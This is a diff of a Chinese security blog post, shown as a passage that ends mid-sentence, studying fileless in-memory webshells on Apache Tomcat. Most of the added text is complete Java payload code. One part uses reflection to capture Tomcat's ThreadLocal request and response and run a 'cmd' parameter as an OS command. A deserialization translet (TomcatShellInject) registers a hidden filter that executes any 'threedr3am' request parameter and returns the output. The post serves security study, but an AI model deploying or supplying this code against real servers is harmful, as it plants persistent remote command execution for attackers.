@@ -31,8 +31,12 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240228205435516.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240228205837333.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240228213134793.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240229104913903.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240229112057309.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240229113741646.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240229121030031.png">
 <meta property="article:published_time" content="2024-02-28T08:44:53.000Z">
-<meta property="article:modified_time" content="2024-02-28T13:32:06.830Z">
+<meta property="article:modified_time" content="2024-03-02T13:17:59.084Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240228170336553.png">
@@ -240,7 +244,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          11k 字
+          41k 字
         
       </span>
     
@@ -251,7 +255,7 @@
         
         
         
-          89 分钟
+          345 分钟
         
       </span>
     
@@ -601,8 +605,786 @@ filterConfigs.put(name, filterConfig);</code></pre></div>
     out.println(<span class="hljs-string">&quot;evil valve inject done!&quot;</span>);
 %&gt;</code></pre></div>
 
+<h2 id="无文件webshell回显连续剧"><a href="#无文件webshell回显连续剧" class="headerlink" title="无文件webshell回显连续剧"></a>无文件webshell回显连续剧</h2><h3 id="kingkk师傅发现一种tomcat通用获取response的方式"><a href="#kingkk师傅发现一种tomcat通用获取response的方式" class="headerlink" title="kingkk师傅发现一种tomcat通用获取response的方式"></a>kingkk师傅发现一种tomcat通用获取response的方式</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7348">https://xz.aliyun.com/t/7348</a></p>
+<p>作者寻找的思路是记录request和response的变量不应该是一个全局变量，而应该是一个ThreadLocal，这样才能获取到当前线程的请求信息。而且最好是一个static静态变量，否则我们还需要去获取那个变量所在的实例。</p>
+<p>在<code>org.apache.catalina.core.ApplicationFilterChain</code>中看上这一部分</p>
+<p>正好在处理我们Controller逻辑之前（下面的service函数</p>
+<p>思路是通过反射修改控制变量，来改变Tomcat处理请求时的流程，使得Tomcat处理请求时便将request,response存入ThreadLocal中，最后在反序列化的时候便可以利用ThreadLocal来取出response</p>
+<p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240229104913903.png" srcset="/img/loading.gif" lazyload alt="image-20240229104913903"></p>
+<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>1、反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>，让代码逻辑走到if条件里面</p>
+<p>2、初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</p>
+<p>3、从<code>lastServicedResponse</code>中获取当前请求response，并且回显内容。</p>
+<h4 id="获取request和response代码"><a href="#获取request和response代码" class="headerlink" title="获取request和response代码"></a>获取request和response代码</h4><p>需要刷新两次的原因是因为第一次只是通过反射去修改值，这样在之后的运行中就会cache我们的请求，从而也就能获取到response。</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">Field WRAP_SAME_OBJECT_FIELD = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;WRAP_SAME_OBJECT&quot;</span>)</span>;
+Field lastServicedRequestField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ApplicationFilterChain</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>)</span>;
+Field lastServicedResponseField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ApplicationFilterChain</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;lastServicedResponse&quot;</span>)</span>;
+Field modifiersField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Field</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>)</span>;
+modifiersField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+modifiersField.set<span class="hljs-constructor">Int(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.<span class="hljs-params">getModifiers</span>()</span> &amp; ~Modifier.FINAL);
+modifiersField.set<span class="hljs-constructor">Int(<span class="hljs-params">lastServicedRequestField</span>, <span class="hljs-params">lastServicedRequestField</span>.<span class="hljs-params">getModifiers</span>()</span> &amp; ~Modifier.FINAL);
+modifiersField.set<span class="hljs-constructor">Int(<span class="hljs-params">lastServicedResponseField</span>, <span class="hljs-params">lastServicedResponseField</span>.<span class="hljs-params">getModifiers</span>()</span> &amp; ~Modifier.FINAL);
+<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WRAP_SAME_OBJECT_FIELD</span>.</span></span>set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+lastServicedRequestField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+lastServicedResponseField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+
+ThreadLocal&lt;ServletResponse&gt; lastServicedResponse =
+    (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(null);
+ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(null);
+boolean WRAP_SAME_OBJECT = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WRAP_SAME_OBJECT_FIELD</span>.</span></span>get<span class="hljs-constructor">Boolean(<span class="hljs-params">null</span>)</span>;
+String cmd = lastServicedRequest != null
+    ? lastServicedRequest.get<span class="hljs-literal">()</span>.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;cmd&quot;</span>)</span>
+    : null;
+<span class="hljs-keyword">if</span> (!WRAP_SAME_OBJECT<span class="hljs-operator"> || </span>lastServicedResponse<span class="hljs-operator"> == </span>null<span class="hljs-operator"> || </span>lastServicedRequest<span class="hljs-operator"> == </span>null) &#123;
+    lastServicedRequestField.set(null, <span class="hljs-keyword">new</span> ThreadLocal&lt;&gt;<span class="hljs-literal">()</span>);
+    lastServicedResponseField.set(null, <span class="hljs-keyword">new</span> ThreadLocal&lt;&gt;<span class="hljs-literal">()</span>);
+    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WRAP_SAME_OBJECT_FIELD</span>.</span></span>set<span class="hljs-constructor">Boolean(<span class="hljs-params">null</span>, <span class="hljs-params">true</span>)</span>;
+&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cmd != null) &#123;
+    ServletResponse responseFacade = lastServicedResponse.get<span class="hljs-literal">()</span>;
+    responseFacade.get<span class="hljs-constructor">Writer()</span>;
+    java.io.Writer w = responseFacade.get<span class="hljs-constructor">Writer()</span>;
+    Field responseField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ResponseFacade</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;response&quot;</span>)</span>;
+    responseField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+    Response response = (Response) responseField.get(responseFacade);
+    Field usingWriter = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Response</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;usingWriter&quot;</span>)</span>;
+    usingWriter.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+    usingWriter.set((Object) response, Boolean.FALSE);
+
+    boolean isLinux = <span class="hljs-literal">true</span>;
+    String osTyp = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;os.name&quot;</span>)</span>;
+    <span class="hljs-keyword">if</span> (osTyp != null<span class="hljs-operator"> &amp;&amp; </span>osTyp.<span class="hljs-keyword">to</span><span class="hljs-constructor">LowerCase()</span>.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;
+        isLinux = <span class="hljs-literal">false</span>;
+    &#125;
+    String<span class="hljs-literal">[]</span> cmds = isLinux ? <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;
+    InputStream <span class="hljs-keyword">in</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(cmds).get<span class="hljs-constructor">InputStream()</span>;
+    Scanner s = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Scanner(<span class="hljs-params">in</span>)</span>.use<span class="hljs-constructor">Delimiter(<span class="hljs-string">&quot;\\a&quot;</span>)</span>;
+    String output = s.has<span class="hljs-constructor">Next()</span> ? s.next<span class="hljs-literal">()</span> : <span class="hljs-string">&quot;&quot;</span>;
+    w.write(output);
+    w.flush<span class="hljs-literal">()</span>;
+&#125;</code></pre></div>
+
+<h3 id="基于上述获取response方法，动态注册Filter"><a href="#基于上述获取response方法，动态注册Filter" class="headerlink" title="基于上述获取response方法，动态注册Filter"></a>基于上述获取response方法，动态注册Filter</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388">https://xz.aliyun.com/t/7388</a></p>
+<h4 id="步骤一-（即上述的获取response的方法"><a href="#步骤一-（即上述的获取response的方法" class="headerlink" title="步骤一 （即上述的获取response的方法"></a>步骤一 （即上述的获取response的方法</h4><p>这里整合成了继承AbstractTranslet的恶意类</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * @author threedr3am</span>
+<span class="hljs-comment"> */</span>
+public <span class="hljs-keyword">class</span> TomcatEchoInject  extends AbstractTranslet &#123;
+
+  static &#123;
+    <span class="hljs-keyword">try</span> &#123;
+      <span class="hljs-comment">/*刚开始反序列化后执行的逻辑*/</span>
+      <span class="hljs-comment">//修改 WRAP_SAME_OBJECT 值为 true</span>
+      Class c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>)</span>;
+      java.lang.reflect.Field f = c.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;WRAP_SAME_OBJECT&quot;</span>)</span>;
+      java.lang.reflect.Field modifiersField = f.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>)</span>;
+      modifiersField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+      modifiersField.set<span class="hljs-constructor">Int(<span class="hljs-params">f</span>, <span class="hljs-params">f</span>.<span class="hljs-params">getModifiers</span>()</span> &amp; ~java.lang.reflect.Modifier.FINAL);
+      f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+      <span class="hljs-keyword">if</span> (!f.get<span class="hljs-constructor">Boolean(<span class="hljs-params">null</span>)</span>) &#123;
+        f.set<span class="hljs-constructor">Boolean(<span class="hljs-params">null</span>, <span class="hljs-params">true</span>)</span>;
+      &#125;
+
+      <span class="hljs-comment">//初始化 lastServicedRequest</span>
+      c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>)</span>;
+      f = c.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>)</span>;
+      modifiersField = f.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>)</span>;
+      modifiersField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+      modifiersField.set<span class="hljs-constructor">Int(<span class="hljs-params">f</span>, <span class="hljs-params">f</span>.<span class="hljs-params">getModifiers</span>()</span> &amp; ~java.lang.reflect.Modifier.FINAL);
+      f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+      <span class="hljs-keyword">if</span> (f.get(null)<span class="hljs-operator"> == </span>null) &#123;
+        f.set(null, <span class="hljs-keyword">new</span> <span class="hljs-constructor">ThreadLocal()</span>);
+      &#125;
+
+      <span class="hljs-comment">//初始化 lastServicedResponse</span>
+      f = c.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;lastServicedResponse&quot;</span>)</span>;
+      modifiersField = f.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>)</span>;
+      modifiersField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+      modifiersField.set<span class="hljs-constructor">Int(<span class="hljs-params">f</span>, <span class="hljs-params">f</span>.<span class="hljs-params">getModifiers</span>()</span> &amp; ~java.lang.reflect.Modifier.FINAL);
+      f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+      <span class="hljs-keyword">if</span> (f.get(null)<span class="hljs-operator"> == </span>null) &#123;
+        f.set(null, <span class="hljs-keyword">new</span> <span class="hljs-constructor">ThreadLocal()</span>);
+      &#125;
+    &#125; catch (Exception e) &#123;
+      e.print<span class="hljs-constructor">StackTrace()</span>;
+    &#125;
+  &#125;
+
+  @Override
+  public void transform(DOM document, SerializationHandler<span class="hljs-literal">[]</span> handlers) throws TransletException &#123;
+
+  &#125;
+
+  @Override
+  public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
+      throws TransletException &#123;
+
+  &#125;
+&#125;</code></pre></div>
+
+<h4 id="步骤二（包含众多细节"><a href="#步骤二（包含众多细节" class="headerlink" title="步骤二（包含众多细节"></a>步骤二（包含众多细节</h4><p>文章几乎没有废话，我这里不重复了，就提一下关键点</p>
+<p>首先获取到request和response对象</p>
+<p>然后动态注入Filter不成功，需要反射修改值（或者通过反射context这个字段自行添加filterDef</p>
+<p>接着最早创建的filter被封装成FilterDef添加到了context的filterDefs中，但是filterMaps中并不存在，其实在下面代码执行<code>filterRegistration.addMappingForUrlPatterns</code>的时候已经添加进去了</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.add<span class="hljs-constructor">Filter(<span class="hljs-string">&quot;threedr3am&quot;</span>, <span class="hljs-params">threedr3am</span>)</span>;
+
+filterRegistration.add<span class="hljs-constructor">MappingForUrlPatterns(<span class="hljs-params">java</span>.<span class="hljs-params">util</span>.EnumSet.<span class="hljs-params">of</span>(<span class="hljs-params">javax</span>.<span class="hljs-params">servlet</span>.DispatcherType.REQUEST)</span>, <span class="hljs-literal">false</span>, <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;/*&quot;</span>&#125;);</code></pre></div>
+
+<p>继续是跟上述一样的问题，FilterDef也不存在filterConfigs中，这里通过反射调用<code>StandardContext</code>的<code>filterStart</code>方法，遍历了filterDefs，一个个实例化成ApplicationFilterConfig添加到filterConfigs</p>
+<p>最后是处理shiro的问题，因为shrio会先处理所有Filter，所以把我们的Filter放在第一位</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> javax.servlet.Filter;
+<span class="hljs-keyword">import</span> javax.servlet.FilterChain;
+<span class="hljs-keyword">import</span> javax.servlet.FilterConfig;
+<span class="hljs-keyword">import</span> javax.servlet.ServletException;
+<span class="hljs-keyword">import</span> javax.servlet.ServletRequest;
+<span class="hljs-keyword">import</span> javax.servlet.ServletResponse;
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@author</span> threedr3am</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TomcatShellInject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;
+
+    <span class="hljs-keyword">static</span> &#123;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-comment">/*shell注入，前提需要能拿到request、response等*/</span>
+            java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> org.apache.catalina.core.ApplicationFilterChain.class
+                .getDeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>);
+            f.setAccessible(<span class="hljs-literal">true</span>);
+            <span class="hljs-type">ThreadLocal</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> (ThreadLocal) f.get(<span class="hljs-literal">null</span>);
+            <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+            <span class="hljs-comment">//不为空则意味着第一次反序列化的准备工作已成功</span>
+            <span class="hljs-keyword">if</span> (t != <span class="hljs-literal">null</span> &amp;&amp; t.get() != <span class="hljs-literal">null</span>) &#123;
+                servletRequest = (ServletRequest) t.get();
+            &#125;
+            <span class="hljs-keyword">if</span> (servletRequest != <span class="hljs-literal">null</span>) &#123;
+                javax.servlet.<span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> servletRequest.getServletContext();
+                org.apache.catalina.core.<span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+                <span class="hljs-comment">//判断是否已有该名字的filter，有则不再添加</span>
+                <span class="hljs-keyword">if</span> (servletContext.getFilterRegistration(<span class="hljs-string">&quot;threedr3am&quot;</span>) == <span class="hljs-literal">null</span>) &#123;
+                    <span class="hljs-comment">//遍历出标准上下文对象</span>
+                    <span class="hljs-keyword">for</span> (; standardContext == <span class="hljs-literal">null</span>; ) &#123;
+                        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">contextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);
+                        contextField.setAccessible(<span class="hljs-literal">true</span>);
+                        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> contextField.get(servletContext);
+                        <span class="hljs-keyword">if</span> (o <span class="hljs-keyword">instanceof</span> javax.servlet.ServletContext) &#123;
+                            servletContext = (javax.servlet.ServletContext) o;
+                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (o <span class="hljs-keyword">instanceof</span> org.apache.catalina.core.StandardContext) &#123;
+                            standardContext = (org.apache.catalina.core.StandardContext) o;
+                        &#125;
+                    &#125;
+                    <span class="hljs-keyword">if</span> (standardContext != <span class="hljs-literal">null</span>) &#123;
+                        <span class="hljs-comment">//修改状态，要不然添加不了</span>
+                        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">stateField</span> <span class="hljs-operator">=</span> org.apache.catalina.util.LifecycleBase.class
+                            .getDeclaredField(<span class="hljs-string">&quot;state&quot;</span>);
+                        stateField.setAccessible(<span class="hljs-literal">true</span>);
+                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
+                        <span class="hljs-comment">//创建一个自定义的Filter马</span>
+                        <span class="hljs-type">Filter</span> <span class="hljs-variable">threedr3am</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TomcatShellInject</span>();
+                        <span class="hljs-comment">//添加filter马</span>
+                        javax.servlet.FilterRegistration.<span class="hljs-type">Dynamic</span> <span class="hljs-variable">filterRegistration</span> <span class="hljs-operator">=</span> servletContext
+                            .addFilter(<span class="hljs-string">&quot;threedr3am&quot;</span>, threedr3am);
+                        filterRegistration.setInitParameter(<span class="hljs-string">&quot;encoding&quot;</span>, <span class="hljs-string">&quot;utf-8&quot;</span>);
+                        filterRegistration.setAsyncSupported(<span class="hljs-literal">false</span>);
+                        filterRegistration
+                            .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="hljs-literal">false</span>,
+                                <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/*&quot;</span>&#125;);
+                        <span class="hljs-comment">//状态恢复，要不然服务不可用</span>
+                        <span class="hljs-keyword">if</span> (stateField != <span class="hljs-literal">null</span>) &#123;
+                            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
+                        &#125;
+
+                        <span class="hljs-keyword">if</span> (standardContext != <span class="hljs-literal">null</span>) &#123;
+                            <span class="hljs-comment">//生效filter</span>
+                            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">filterStartMethod</span> <span class="hljs-operator">=</span> org.apache.catalina.core.StandardContext.class
+                                .getMethod(<span class="hljs-string">&quot;filterStart&quot;</span>);
+                            filterStartMethod.setAccessible(<span class="hljs-literal">true</span>);
+                            filterStartMethod.invoke(standardContext, <span class="hljs-literal">null</span>);
+
+                            <span class="hljs-comment">//把filter插到第一位</span>
+                            org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext
+                                .findFilterMaps();
+                            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; filterMaps.length; i++) &#123;
+                                <span class="hljs-keyword">if</span> (filterMaps[i].getFilterName().equalsIgnoreCase(<span class="hljs-string">&quot;threedr3am&quot;</span>)) &#123;
+                                    org.apache.tomcat.util.descriptor.web.<span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> filterMaps[i];
+                                    filterMaps[i] = filterMaps[<span class="hljs-number">0</span>];
+                                    filterMaps[<span class="hljs-number">0</span>] = filterMap;
+                                    <span class="hljs-keyword">break</span>;
+                                &#125;
+                            &#125;
+                        &#125;
+                    &#125;
+                &#125;
+            &#125;
+        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span>
+        <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;
+
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse,</span>
+<span class="hljs-params">        FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;
+        System.out.println(
+            <span class="hljs-string">&quot;TomcatShellInject doFilter.....................................................................&quot;</span>);
+        String cmd;
+        <span class="hljs-keyword">if</span> ((cmd = servletRequest.getParameter(<span class="hljs-string">&quot;threedr3am&quot;</span>)) != <span class="hljs-literal">null</span>) &#123;
+            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);
+            java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(
+                <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(process.getInputStream()));
+            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">stringBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
+            String line;
+            <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;
+                stringBuilder.append(line + <span class="hljs-string">&#x27;\n&#x27;</span>);
+            &#125;
+            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+            servletResponse.getOutputStream().flush();
+            servletResponse.getOutputStream().close();
+            <span class="hljs-keyword">return</span>;
+        &#125;
+        filterChain.doFilter(servletRequest, servletResponse);
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;
+
+    &#125;
+&#125;</code></pre></div>
+
+<p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240229112057309.png" srcset="/img/loading.gif" lazyload alt="image-20240229112057309"></p>
+<h3 id="另起炉灶寻找获取request和response的方式"><a href="#另起炉灶寻找获取request和response的方式" class="headerlink" title="另起炉灶寻找获取request和response的方式"></a>另起炉灶寻找获取request和response的方式</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">https://mp.weixin.qq.com/s?__biz&#x3D;MzIwNDA2NDk5OQ&#x3D;&#x3D;&amp;mid&#x3D;2651374294&amp;idx&#x3D;3&amp;sn&#x3D;82d050ca7268bdb7bcf7ff7ff293d7b3</a></p>
+<p>看原文，因为自己也没什么收获，总结不出东西</p>
+<p>经过作者分析得出来这样的东西</p>
+<div class="code-wrapper"><pre><code class="hljs xl">S<span class="hljs-function"><span class="hljs-title">tandardService</span>---&gt;</span>C<span class="hljs-function"><span class="hljs-title">onnector</span>---&gt;</span>A<span class="hljs-function"><span class="hljs-title">bstractProtocol</span>$ConnectoinHandler---&gt;</span>R<span class="hljs-function"><span class="hljs-title">equestGroupInfo</span>(global)---&gt;</span>R<span class="hljs-function"><span class="hljs-title">equestInfo</span>-------&gt;</span>R<span class="hljs-function"><span class="hljs-title">equest</span>--------&gt;</span>Response</code></pre></div>
+
+<p>然后我们需要了解一个东西</p>
+<p><strong>Tomcat的类加载机制并不是传统的双亲委派机制，因为传统的双亲委派机制并不适用于多个Web App的情况。</strong></p>
+<p>假设WebApp A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2 这样在加载的时候由于全限定名相同，不能同时加载，所以必须对各个webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离，</p>
+<p>tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是WebappClassLoader</p>
+<p>之前有了解过，但不会利用</p>
+<p>通过<code>Thread.currentThread.getContextClassLoader()</code>获取上下文类加载器</p>
+<p>在这之中就有我们需要的<code>StandardService</code></p>
+<p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240229113741646.png" srcset="/img/loading.gif" lazyload alt="image-20240229113741646"></p>
+<p>最后变成</p>
